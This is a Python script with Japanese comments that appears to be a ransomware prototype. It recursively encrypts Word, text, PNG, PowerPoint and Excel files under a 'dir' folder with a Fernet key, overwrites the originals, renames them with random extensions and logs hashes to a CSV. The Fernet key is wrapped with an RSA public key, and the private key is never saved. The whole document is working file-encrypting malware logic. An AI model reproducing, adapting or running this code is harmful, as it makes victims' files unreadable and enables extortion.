import sys
import os
import glob
import random
import string
import hashlib
import csv
from cryptography.fernet import Fernet
from cryptography.hazmat.primitives import serialization, asymmetric, hashes

def generate_RSA_key():
    """まだ存在しない場合は鍵を作成"""
    if not os.path.isfile("public_key.pem"):
        private_key = asymmetric.rsa.generate_private_key(key_size = 2048, public_exponent=65537)
        public_key = private_key.public_key()

        """公開鍵の書き出し"""
        with open("public_key.pem", "wb") as f:
            f.write(public_key.public_bytes(
                encoding=serialization.Encoding.PEM,
                format=serialization.PublicFormat.SubjectPublicKeyInfo
            ))
        
def generate_fernet_key():
    generate_RSA_key()
    """公開鍵の読み込み"""
    with open('public_key.pem', 'rb') as f:
        public_key = serialization.load_pem_public_key(f.read())
    
    """共通鍵の生成"""
    key = Fernet.generate_key()
    
    """データの暗号化"""
    ciphertext = public_key.encrypt(
        key,
        asymmetric.padding.OAEP(
            mgf=asymmetric.padding.MGF1(algorithm=hashes.SHA256()),
            algorithm=hashes.SHA256(),
            label=None
        )
    )
    with open('p.key','wb') as f:
        f.write(ciphertext)
    
    return key


def file2crypt(filepath,key):
    """パス指定したファイルを暗号化する"""
    
    with open(filepath, 'rb') as f:
        data = f.read()
        
    fernet = Fernet(key)
    encrypted = fernet.encrypt(data)
    
    with open(f'{filepath}', 'wb') as f:
        f.write(encrypted)
        
#ランダム文字列を作成する
def GetRandom(n):
    randlst = [random.choice(string.ascii_letters + string.digits + string.ascii_uppercase) for i in range(n)]
    return ''.join(randlst)

if os.path.isfile("fukugenn2.csv"):
    sys.exit()
    
#.docxファイルのファイル名を取得
path1 = 'dir/**/*.docx'
list1 = glob.glob(path1, recursive=True)

#.txtファイルのファイル名の取得
path2 = 'dir/**/*.txt'
list2 = glob.glob(path2, recursive=True)

#.pngファイルのファイル名を取得
path3 = 'dir/**/*.png'
list3 = glob.glob(path3, recursive=True)

#.pptxファイルのファイル名を取得
path4 = 'dir/**/*.pptx'
list4 = glob.glob(path4, recursive=True)

# #.xlsxファイルのファイル名を取得
path5 = 'dir/**/*.xlsx'
list5 = glob.glob(path5, recursive=True)


#空の辞書型の生成
mydict = {}

"""共通鍵の生成、書き出し"""
key = generate_fernet_key()

#暗号化の処理
for i in list1:
    with open(i,'rb') as file:
        file2crypt(i,key)
        fileData = file.read()
        hash_sha256 = hashlib.sha256(fileData).hexdigest()
        mydict[i] = hash_sha256
        
for i in list2:
    with open(i,'rb') as file:
        file2crypt(i,key)
        fileData = file.read()
        hash_sha256 = hashlib.sha256(fileData).hexdigest()
        mydict[i] = hash_sha256
        
for i in list3:
    with open(i,'rb') as file:
        file2crypt(i,key)
        fileData = file.read()
        hash_sha256 = hashlib.sha256(fileData).hexdigest()
        mydict[i] = hash_sha256
        
for i in list4:
    with open(i,'rb') as file:
        file2crypt(i,key)
        fileData = file.read()
        hash_sha256 = hashlib.sha256(fileData).hexdigest()
        mydict[i] = hash_sha256

for i in list5:
    with open(i,'rb') as file:
        file2crypt(i,key)
        fileData = file.read()
        hash_sha256 = hashlib.sha256(fileData).hexdigest()
        mydict[i] = hash_sha256
        
        
#拡張子を変更した処理
for file in list1:
    ren = GetRandom(5)
    os.rename(file,file + '.' + ren)

for file in list2:
    ren = GetRandom(5)
    os.rename(file,file + '.' + ren)
    
for file in list3:
    ren = GetRandom(5)
    os.rename(file,file + '.' + ren)

for file in list4:
    ren = GetRandom(5)
    os.rename(file,file + '.' + ren)

for file in list5:
    ren = GetRandom(5)
    os.rename(file,file + '.' + ren)
    
#辞書型のキーと値を入れ替える
mydict2 = {mydict[i]:i for i in mydict.keys()}

#csvファイルに辞書型を出力
with open('fukugenn2.csv','w') as f:
    writer = csv.writer(f)
    for k,v in mydict2.items():
        writer.writerow([k,v])
